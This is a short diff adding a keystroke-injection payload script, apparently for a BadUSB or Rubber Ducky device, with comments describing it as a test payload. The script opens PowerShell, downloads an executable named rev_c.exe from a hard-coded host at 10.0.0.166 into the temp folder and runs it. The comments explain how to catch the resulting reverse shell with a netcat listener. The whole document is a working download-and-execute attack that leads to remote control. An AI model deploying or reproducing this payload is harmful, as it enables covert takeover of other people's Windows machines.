@@ -1,0 +1,16 @@
+REM Sample payload I used when testing the program for the first time
+REM This way you can check if the exe file is running correctly. If it does, a cmd window will open and remain open until
+REM you close it. Meanwhile, you can type "nc -lp 1584" on your linux machine to connect to the reverse shell.
+REM Remember to change the host IP and port number. Here 1584 is arbitrary, you can choose any number.
+
+GUI R
+DELAY 2
+STRING PowerShell
+DELAY 1
+ENTER
+DELAY 2
+STRING $url = "http://10.0.0.166:1584/Documents/rev_c.exe"; $outpath = "$env:temp/rev_c.exe"; Invoke-WebRequest -Uri $url -OutFile $outpath
+ENTER
+DELAY 1
+STRING Start-Process -Filepath "$env:temp/rev_c.exe"
+ENTER
